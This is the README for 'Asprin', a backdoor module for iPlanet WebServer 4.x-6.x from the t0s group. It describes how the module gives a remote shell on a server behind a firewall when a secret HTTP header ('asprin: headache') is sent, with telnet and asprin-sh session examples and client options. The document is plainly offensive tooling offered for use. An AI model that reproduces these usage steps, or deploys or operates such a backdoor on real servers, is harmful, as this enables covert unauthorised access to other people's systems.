  __ _ ___ _ __  _ __(_)_ __  
 / _` / __| '_ \| '__| | '_ \ 
| (_| \__ \ |_) | |  | | | | |
 \__,_|___/ .__/|_|  |_|_| |_|
          |_|                 
               by sage@t0s.org

README
------
  Asprin is a SAF for Iplanet WebServer 4.x-6.x and is created to 
  be a great backdoor, specialy when the Iplanet webserver is behind 
  a firewall. Previously to give you a shell you need to put 
  a speciall header name and its value. By default the header name is
  "asprin" and his value is "headache".


  Since version 2.0 of asprin project, to have a best tty support,
  a new program has been included in the project, this is asprin-sh.
  But if you want you can use telnet client to gain a shell how you
  can see in this example.


  ---------------------
  # telnet localhost 80
  Trying 127.0.0.1...
  Connected to ptt0.
  Escape character is '^]'.
  GET / HTTP/1.0
  asprin: headache;1;vt100;80;25;

  Asprin v.2.0.0
  test:/$
  ---------------------


  asprin-sh have best tty support and it's more easy to use
  than telnet. See and example.

  ---------------------
  # asprin-sh localhost
  Asprin Shell Client v.2.0.0
  [*] Connecting to localhost
  [!] Using default header name: asprin
  [!] Using default header value: headache
  [!] Using default port: 80
  [*] Term: linux
  [*] Columns: 80,Rows: 60



  Asprin v.2.0.0
  test:/$
  ---------------------
  
  asprin-sh allow you to specify the next options:

  -p <port> : Port to connect.
  -n <name>: Header name. [asprin]
  -v <value>: Header value. [headache]
  -c <command>: Command to execute. [bash]
  -s: Use SSL (not implemented yet!)
  -h: Show this help.


  Find out how to install and configure Asprin by reading the 
  INSTALL document.

  Study the COPYING file for distribution terms and similar.

CONTACT
-------

  If you have problems, questions, ideas or suggestions, please contact us
  sending a email to sage@t0s.org or staff@t0s.org.

WEB SITE
--------

  Visit the t0s web site for the latest news:

    http://www.t0s.org/

THANKS
------

  Special thanks to jfs and DarkRaver for their help and contributions
  that have done this project a reality.

